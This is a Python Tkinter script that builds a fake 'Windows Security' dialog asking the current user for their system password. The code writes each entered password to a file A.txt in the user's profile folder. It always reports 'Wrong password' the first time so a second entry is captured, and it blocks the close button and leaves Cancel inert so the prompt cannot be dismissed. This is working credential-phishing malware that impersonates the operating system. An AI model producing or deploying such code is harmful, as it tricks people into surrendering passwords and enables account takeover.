from tkinter.ttk import *       #For Tkinter designs
from tkinter import *           #For Tkinter module
from PIL import Image, ImageTk  #For all image operations
from getpass import getuser     #For username of system

window=Tk()                     #Creating a window
window.title("Windows Security".center(75))         #Window title
window.geometry("400x275")      #Window size
window.resizable(0,0)           #Fixed window size and not resizable

width = 400
height = 275
x = (window.winfo_screenwidth() // 2) - (width // 2)
y = (window.winfo_screenheight() // 2) - (height // 2)
window.geometry('{}x{}+{}+{}'.format(width, height, x, y))

username = getuser()            #Get username of system

lbl=Label(window,text="Enter system credentials", font=("Lucida Sans",13),foreground="#095BE2",width="25")      #Text
lbl.grid(column=0, row=0)       #Text alignment

lbl1=Label(window,text="Enter your credentials to continue", font=("Lucida Sans",9),foreground="#232323",width="30")
lbl1.grid(column=0, row=1)

#Placing user image in required position
load = Image.open("user_icon.png")  #
render = ImageTk.PhotoImage(load)
img = Label(window, image=render)
img.image = render
img.place(x=30, y=70)

lbl2=Label(window,text=username, font=("Lucida Sans",10),foreground="#232323",width="10")
lbl2.place(x=140, y=80)

#Input password field
txt=Entry(window,width=20)                      #Entry for getting input from user
txt.configure({"background":"#ECF3FF"})
txt.configure({"show":"*"})                     #Show * for password
txt.place(x=150, y=120,width="150",height="23")
txt.focus()

#For checkbox
chk1_state=IntVar()
chk1_state.set(1)
chk1=Checkbutton(window,text="",var=chk1_state)
chk1.place(x=140, y=160,width="40",height="30")

lbl3=Label(window,text="Remember my credentials", font=("Lucida Sans",9),foreground="#232323",width="22")
lbl3.place(x=168, y=165)

#For warning image
load2 = Image.open("warning_icon.png")
render2 = ImageTk.PhotoImage(load2)
img2 = Label(window, image=render2)
img2.image = render2
img2.place(x=30, y=200)

lbl4=Label(window,text="Additional security for protection against malwares.", font=("Lucida Sans",8),foreground="#232323",width="40")
lbl4.place(x=50, y=200)

#For 1st ok press
def ok_button():
    username = getuser()
    path="C:\\Users\\"+username+"\\A.txt"
    f=open(path,"a")
    f.write(txt.get()+"\n")         #Write password to the file
    f.close()
    lbl5=Label(window,text="Wrong password                                                                     ", font=("Lucida Sans",8),foreground="#232323",width="45")
    lbl5.place(x=50, y=200)
    
    btn = ttk.Button(window, text = 'OK',command = ok_button1)#,background="light blue",width="6")
    btn.place(x=220, y=230)
    
#For 2nd ok button    
def ok_button1():
    username = getuser()
    path="C:\\Users\\"+username+"\\A.txt"
    f=open(path,"a")
    f.write(txt.get()+"\n")             #Store second password to the file
    f.close()
    window.destroy()                    #Close the window

#For disabling close function of window    
def disable_event():
    pass  

#Ok button
btn = ttk.Button(window, text = 'OK',command = ok_button)#,background="light blue",width="6")
btn.place(x=220, y=230)

#Useless Cancel button
btn1 = ttk.Button(window, text = 'Cancel')
btn1.place(x=300, y=230)

window.protocol("WM_DELETE_WINDOW", disable_event)      #Windows close prevention

Style=ttk.Style()
Style.theme_use("default")

window.mainloop()